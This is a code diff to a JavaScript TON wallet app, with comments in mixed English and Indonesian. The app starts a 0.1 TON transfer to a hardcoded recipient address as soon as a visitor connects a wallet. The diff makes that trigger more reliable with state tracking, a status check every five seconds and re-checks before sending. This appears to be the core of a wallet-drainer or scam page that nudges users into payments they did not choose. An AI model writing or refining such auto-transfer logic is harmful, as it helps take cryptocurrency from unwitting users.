@@ -1,10 +1,11 @@
-// TON Transfer App - Always Auto Transfer
+// TON Transfer App - Fixed Disconnect Sync
 class TONTransferApp {
     constructor() {
         this.tonConnectUI = null;
         this.autoTransferEnabled = true;
         this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
         this.staticAmount = "0.1";
+        this.isReallyConnected = false; // ✅ TRACK REAL CONNECTION STATE
         this.init();
     }
 
@@ -18,10 +19,33 @@ class TONTransferApp {
             this.setupEventListeners();
             this.preFillForm();
             
+            // ✅ CHECK REAL-TIME WALLET STATE SAAT INIT
+            this.checkRealTimeWalletState();
+            
             console.log('TON Connect UI initialized successfully');
         } catch (error) {
             console.error('Failed to initialize TON Connect:', error);
             this.showStatus('Failed to initialize wallet connection', 'error');
+        }
+    }
+
+    // ✅ METHOD BARU: CHECK REAL-TIME WALLET STATE
+    async checkRealTimeWalletState() {
+        try {
+            const wallet = await this.tonConnectUI.getWallet();
+            if (wallet) {
+                console.log('Wallet is actually connected');
+                this.isReallyConnected = true;
+                this.onWalletConnected(wallet);
+            } else {
+                console.log('Wallet is actually disconnected');
+                this.isReallyConnected = false;
+                this.onWalletDisconnected();
+            }
+        } catch (error) {
+            console.log('Error checking wallet state:', error);
+            this.isReallyConnected = false;
+            this.onWalletDisconnected();
         }
     }
 
@@ -44,13 +68,20 @@ class TONTransferApp {
     setupConnectionListener() {
         this.tonConnectUI.onStatusChange((wallet) => {
             if (wallet) {
-                console.log('Wallet connected - triggering auto-transfer');
+                console.log('Wallet connected via status change');
+                this.isReallyConnected = true;
                 this.onWalletConnected(wallet);
             } else {
-                console.log('Wallet disconnected');
+                console.log('Wallet disconnected via status change');
+                this.isReallyConnected = false;
                 this.onWalletDisconnected();
             }
         });
+
+        // ✅ ADDITIONAL: PERIODIC CHECK UNTUK SYNC STATE
+        setInterval(() => {
+            this.checkRealTimeWalletState();
+        }, 5000); // Check every 5 seconds
     }
 
     setupEventListeners() {
@@ -83,7 +114,9 @@ class TONTransferApp {
     }
 
     onWalletConnected(wallet) {
-        // ✅ UPDATE UI
+        // ✅ ONLY UPDATE UI IF STATE REALLY CHANGED
+        if (!this.isReallyConnected) return;
+        
         document.getElementById('connectionSection').style.display = 'none';
         document.getElementById('transferSection').style.display = 'block';
         
@@ -92,13 +125,18 @@ class TONTransferApp {
         
         this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');
         
-        // ✅ SELALU TRIGGER AUTO-TRANSFER SETELAH CONNECTED
+        // ✅ AUTO-TRANSFER ONLY IF REALLY CONNECTED
         setTimeout(() => {
-            this.autoSendTransaction();
+            if (this.isReallyConnected) {
+                this.autoSendTransaction();
+            }
         }, 1000);
     }
 
     onWalletDisconnected() {
+        // ✅ ONLY UPDATE UI IF STATE REALLY CHANGED
+        if (this.isReallyConnected) return;
+        
         document.getElementById('connectionSection').style.display = 'block';
         document.getElementById('transferSection').style.display = 'none';
         this.clearForm();
@@ -107,17 +145,31 @@ class TONTransferApp {
     }
 
     async disconnectWallet() {
-        await this.tonConnectUI.disconnect();
+        try {
+            await this.tonConnectUI.disconnect();
+            this.isReallyConnected = false;
+            this.onWalletDisconnected();
+        } catch (error) {
+            console.error('Disconnect error:', error);
+        }
     }
 
     async autoSendTransaction() {
+        // ✅ DOUBLE CHECK MASIH CONNECTED
+        if (!this.isReallyConnected) {
+            this.showStatus('Wallet disconnected during auto-transfer', 'error');
+            return;
+        }
+
         this.showStatus('🔄 Preparing auto-transfer...', 'loading');
         
         try {
-            const wallet = this.tonConnectUI.wallet;
+            const wallet = await this.tonConnectUI.getWallet(); // ✅ REAL-TIME CHECK
             
             if (!wallet) {
-                this.showStatus('Wallet not ready for auto-transfer', 'error');
+                this.showStatus('Wallet disconnected during preparation', 'error');
+                this.isReallyConnected = false;
+                this.onWalletDisconnected();
                 return;
             }
 
@@ -140,6 +192,15 @@ class TONTransferApp {
 
             this.showStatus('📱 Confirm auto-transfer in your wallet...', 'loading');
             
+            // ✅ REAL-TIME CHECK SEBELUM KIRIM
+            const currentWallet = await this.tonConnectUI.getWallet();
+            if (!currentWallet) {
+                this.showStatus('Wallet disconnected before sending', 'error');
+                this.isReallyConnected = false;
+                this.onWalletDisconnected();
+                return;
+            }
+            
             const result = await this.tonConnectUI.sendTransaction(transaction);
             
             this.showStatus('✅ Auto-transfer successful!', 'success');
@@ -149,6 +210,20 @@ class TONTransferApp {
             
         } catch (error) {
             console.error('Auto-transfer failed:', error);
+            
+            // ✅ CHECK IF DISCONNECTED DURING PROCESS
+            try {
+                const wallet = await this.tonConnectUI.getWallet();
+                if (!wallet) {
+                    this.isReallyConnected = false;
+                    this.onWalletDisconnected();
+                    return;
+                }
+            } catch (e) {
+                this.isReallyConnected = false;
+                this.onWalletDisconnected();
+                return;
+            }
             
             if (error.message.includes('User rejection')) {
                 this.showStatus('❌ Auto-transfer cancelled', 'error');
@@ -163,10 +238,12 @@ class TONTransferApp {
     }
 
     async sendTransaction() {
-        const wallet = this.tonConnectUI.wallet;
-        
+        // ✅ REAL-TIME CHECK SEBELUM TRANSFER
+        const wallet = await this.tonConnectUI.getWallet();
         if (!wallet) {
-            this.showStatus('Please connect wallet first', 'error');
+            this.showStatus('Wallet disconnected', 'error');
+            this.isReallyConnected = false;
+            this.onWalletDisconnected();
             return;
         }
 
@@ -213,7 +290,6 @@ class TONTransferApp {
     }
 
     clearForm() {
-        // ✅ JANGAN CLEAR VALUE STATIS
         document.getElementById('message').value = '';
         document.querySelector('.char-count').textContent = '0/100';
     }
